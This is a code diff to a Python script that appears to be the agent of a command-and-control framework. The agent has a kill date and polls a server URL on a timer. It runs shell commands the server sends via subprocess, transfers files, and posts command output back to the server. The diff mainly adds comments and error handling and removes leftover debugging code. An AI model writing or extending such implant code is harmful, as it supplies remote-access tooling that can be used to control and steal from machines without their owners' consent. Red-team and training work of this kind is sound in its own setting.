@@ -10,7 +10,9 @@ import os, tempfile
 # variables that should be changed
 # date in yyyy/mm/dd format
 killdate= datetime.datetime(2021,12,14)
+# Url used to connect to the server 
 ServerUrl="http://localhost:8000/"
+# number of seconds until the agent callsback to the server
 sleep_interval=10
 
 def checkDate(aKilldate):
@@ -58,7 +60,17 @@ def execute_command(data):
                 return "Failed"
         #print("file transfer")
     if data['CommandType']=='ShellCommand':
-        return subprocess.check_output(data['Command'].split(' '))
+        try:
+            # parsed_command=data['Command'].split(' ')
+            # print(parsed_command)
+            # process=subprocess.check_output(parsed_command,shell=True)
+            # return process
+            cmd=data['Command'].split(' ')
+            return subprocess.check_output(cmd,shell=False)
+        except:
+            return "Failed"
+        #return subprocess.run(data['Command'].split(' '),capture_output=True,shell=True).stdout
+        #return subprocess.check_output(data['Command'].split(' '),shell=True)
 
 def download_file(command_id,filename):
     response= requests.get(ServerUrl+"api/AgentDownload/"+str(command_id)+"/")
@@ -75,6 +87,26 @@ def Upload_file(file_id,afile,path):
 def report_output(output,command_id):
     data={'output':output,'id': command_id }
     requests.post(ServerUrl+"api/agentreportoutput/",data=data)
+# # def parseString(inputString):
+#     output = inputString.split()
+#     res = []
+#     count = 0
+#     temp = []
+#     for word in output:
+#         if (word.startswith('"')) and count % 2 == 0:
+#             temp.append(word)
+#             count += 1
+#         elif count % 2 == 1 and not word.endswith('"'):
+#             temp.append(word)
+#         elif word.endswith('"'):
+#             temp.append(word)
+#             count += 1
+#             tempWord = ' '.join(temp)
+#             res.append(tempWord)
+#             temp = []
+#         else:
+#             res.append(word)
+#     return res
 # main method
 #has_registered=False
 def main():
@@ -102,25 +134,3 @@ if __name__ == "__main__":
 
 
 
-
-
-
-#agent_id=register(AgentName)
-#print(agent_id)
-
-# #print( register(AgentName))
-# json_data= get_command(agent_id)
-# output=execute_command(json_data)
-# print(output)
-# print(json_data['id'])
-# report_output(output,json_data['id'])
-#download_file(2,"filenmae.txt")
-
-
-# this is when we register
-#response = requests.get("https://192.168.150.111/api/v1/vmware/vm?name="+vmname, auth=auth_values, verify=False)
-# data = {"name" : AgentName}
-# data_json = json.dumps(data)
-# headers = {'Content-type': 'application/json'}
-# # response = requests.post(ServerUrl+"api/register/", data=data_json, headers=headers)
-# print(response.json())
